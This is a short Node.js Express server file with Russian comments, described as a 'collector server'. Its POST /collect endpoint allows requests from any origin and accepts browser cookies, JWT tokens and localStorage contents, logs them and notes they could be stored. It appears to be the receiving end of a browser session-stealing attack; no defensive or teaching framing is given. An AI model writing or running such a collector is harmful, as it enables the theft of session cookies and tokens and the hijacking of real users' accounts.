// server.js
const express = require('express');
const jwtLib = require('jsonwebtoken');
const app = express();

// 🔑 Секрет для верификации JWT (замените на ваш)
const JWT_SECRET = 'ВАШ_SUPER_СЕКРЕТ';

// 1. Разрешаем CORS и парсим JSON
app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// 2. Обработчик сбора данных
app.post('/collect', (req, res) => {
  const { cookies, jwt, storage, timestamp } = req.body;

  // 2.1. Проверка JWT (если пришёл)
  let validJwt = false;
  if (jwt) {
    try {
      jwtLib.verify(jwt, JWT_SECRET);
      validJwt = true;
    } catch (e) {
      console.warn('Invalid JWT:', e.message);
    }
  }

  // 2.2. Логируем всё
  console.log('--- New collection @', timestamp);
  console.log('JWT valid:', validJwt);
  console.log('Cookies:', cookies);
  console.log('LocalStorage keys:', Object.keys(storage));
  // (При желании можно сохранять в БД или в файл)

  // 2.3. Ответ клиенту
  return res.json({
    status: 'ok',
    jwtValid: validJwt,
    receivedCookies: cookies.length,
    receivedStorage: Object.keys(storage).length
  });
});

// 3. Запуск
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Collector server listening on port ${PORT}`);
});
